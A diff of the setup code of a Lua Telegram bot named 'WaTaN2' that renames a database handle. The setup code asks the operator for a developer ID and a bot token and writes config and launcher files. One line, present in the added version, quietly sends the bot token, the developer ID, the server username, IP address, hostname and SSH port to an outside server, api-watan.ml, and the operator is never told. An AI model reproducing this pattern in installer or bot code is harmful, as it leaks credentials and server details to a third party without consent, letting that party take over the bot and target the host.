@@ -21,7 +21,7 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source WaTaN2     --
 local AutoSet = function() 
-if not DevRio:get(Server.."IdWaTaN2") then 
+if not DevAbs:get(Server.."IdWaTaN2") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
@@ -34,7 +34,7 @@ os.execute('lua WaTaN2.lua')
 end ---ifBn
 if Abs.Result.Info == 'Ok' then
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevRio:set(Server.."IdWaTaN2",DevId) 
+DevAbs:set(Server.."IdWaTaN2",DevId) 
 end ---ifok
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -42,7 +42,7 @@ end
 os.execute('lua WaTaN2.lua') 
 end
 end 
-if not DevRio:get(Server.."TokenWaTaN2") then 
+if not DevAbs:get(Server.."TokenWaTaN2") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -51,7 +51,7 @@ if res ~= 200 then
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevRio:set(Server.."TokenWaTaN2",TokenBot) 
+DevAbs:set(Server.."TokenWaTaN2",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -71,18 +71,18 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevRio:get(Server.."IdWaTaN2"),
-TokenBot = DevRio:get(Server.."TokenWaTaN2"),
-WaTaN2 = DevRio:get(Server.."TokenWaTaN2"):match("(%d+)"),
-SudoIds = {DevRio:get(Server.."IdWaTaN2")},
+DevId = DevAbs:get(Server.."IdWaTaN2"),
+TokenBot = DevAbs:get(Server.."TokenWaTaN2"),
+WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
+SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevRio:get(Server.."IdWaTaN2").."&TokenBot="..DevRio:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdWaTaN2").."&TokenBot="..DevAbs:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/WaTaN2
-token="]]..DevRio:get(Server.."TokenWaTaN2")..[["
+token="]]..DevAbs:get(Server.."TokenWaTaN2")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -123,7 +123,7 @@ if not f then
 AutoSet() 
 else 
 f:close() 
-DevRio:del(Server.."IdWaTaN2");DevRio:del(Server.."TokenWaTaN2")
+DevAbs:del(Server.."IdWaTaN2");DevAbs:del(Server.."TokenWaTaN2")
 end 
 local config = loadfile("./config.lua")() 
 return config 
